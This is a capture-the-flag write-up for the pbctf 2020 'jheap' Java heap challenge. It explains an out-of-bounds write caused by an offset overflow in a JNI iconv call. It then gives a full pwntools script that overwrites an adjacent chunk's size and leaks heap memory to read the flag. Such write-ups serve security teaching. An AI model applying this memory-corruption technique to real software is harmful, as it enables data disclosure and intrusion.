Writeup by - [Faith](https://twitter.com/farazsth98)  
I spent around 3 hrs solving this. I wish I had more time to spend on this CTF because the challenges looked really good!

# Challenge

* **Points**: 420
* **Solves**: 4
* **Files**: [jheap.tar.gz](https://storage.googleapis.com/pbctf-2020-ctfd/ab76a2f1cb135751491b577613e89c2f/jheap.tar.gz), [jheap.conf](https://storage.googleapis.com/pbctf-2020-ctfd/d33db98e497d702ff84f0e29f62da25d/jheap.conf)

Basically just a Java Heap pwn challenge. You can create and edit chunks, but its done through a JNI function written in C, which means memory corruption is a possibility.

# Bug

In `src/heap.c`, when `from_utf` is called, the `outbuf` argument for `iconv` is set to `data + offset*2`. `offset*2` can overflow past `data` easily which provides an OOB write on the java heap.

# Exploit

Through trial and error I found that if you put the flag into the very last data chunk, then the data chunk's buffer is a few hex thousand bytes before the flag's contents. My idea then was to use the oob write from the second last data chunk to overwrite the last data chunk's size to a large number, and then view the last data chunk to hopefully get the flag.

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./deploy/bin/java")
#p = process(["./deploy/bin/java", "-Xmx200m", "-XX:+UseG1GC", "-Xms200m", "-m", "jheap/com.thekidofarcrania.heap.JHeap", "-XX:+PrintJNIGCStalls", "-XX:+PrintGCDetails"])
p = remote("jheap.chal.perfect.blue", 1)

def edit(idx, offset, content):
    p.sendlineafter("> ", "0")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Offset: ", str(offset))
    p.sendlineafter("Content: ", content)

def leak(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Index: ", str(idx))

def view(idx):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Index: ", str(idx))

# Chunks are initialized full of null bytes. You can view a chunk and count the
# number of bytes returned to get the size of the chunk
def get_size(idx):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Index: ", str(idx))

    p.recvuntil(" = ")
    data = p.recvuntil("*")[:-1]

    return len(data)-2 # account for newline

# Control chunk 47's len through this, set it to 0x40000
# I found the +11 offset through trial and error and just checking GDB
# I found that using magic values ("QWERASDFZXCV" is what i used) combined
# with search-pattern in gdb gef worked really well for me to find my chunk
# The offset doesn't work 100% of the time but it works most of the time
edit(46, get_size(46)//2+11, "\u0000\u0004" + "\u1337"*6)

# Put the flag on the heap way past chunk 47
leak(47)

#gdb.attach(p)

# Leak 0x40000 bytes, hopefully the flag will be inside
view(47)

# Find the flag
flag = p.recvuntil(">>> JHeap")
idx = flag.find(b"pbctf{")

# Print dat shit
if idx != -1:
    print(flag[idx:idx+80])

p.interactive()
```
